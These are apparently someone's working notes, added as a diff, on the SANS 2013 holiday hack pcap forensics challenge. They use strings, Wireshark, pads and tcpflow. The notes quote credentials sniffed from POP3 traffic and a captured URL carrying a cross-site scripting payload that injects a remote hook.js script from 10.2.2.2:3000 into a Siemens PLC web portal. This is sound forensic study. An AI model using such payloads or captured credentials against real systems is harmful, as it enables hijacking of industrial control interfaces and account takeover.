@@ -1,0 +1,46 @@
+sans christmas challange
+
+ran strings over the pcap to find anything interesting
+	strings sansholidayhack2013.pcap >strings.txt
+interestingly checking for meterpreter found some shell instances
+	strings sansholidayhack2013.pcap |grep -A5 -i meterpr |less
+
+
+wiresharking the pcap - interesting filters
+
+	dns.flags == 0x8180
+finds all dns responses
+	pop
+gives all pop3 traffic including usernames/passwords
+	username/password dsawyer/Fashionista
+
+following stream of pop traffic provides link to PLC controller:
+
+http://10.25.22.23/Portal/Portal.mwsl?PriNav=3DStart&Send=3D%27%3E%3Cscrip=
+t%20src=3D%22http://10.2.2.2:3000/hook.js%E2%80%9D%3E&elementId=3D31337&Si=
+maticModel=3DS7-1200&ControlInterface=3DEnabled&StationName=3DCPU1212C_ACD=
+CRly&OperatingMode=3DRun&ShowStatusColor=3DYES
+
+used pads to find ip address'. operating systems and ports being used -
+produced assets.txt
+	pads -r sansholidayhack2013.pcap
+
+IPs i'd like to have another look at
+10.2.2.2 - port 8081 looks like proxy
+10.22.11.9
+
+10.22.11.9:80
+	tmpurykq.php
+
+
+apache 2.2.14
+mod
+
+tcpflow -
+make seperate directory extracts all the tcp streams as files
+
+ tcpflow -r ../sansholidayhack2013.pcap
+
+wireshark filter for smb
+then export/objects/smb found an exe
+
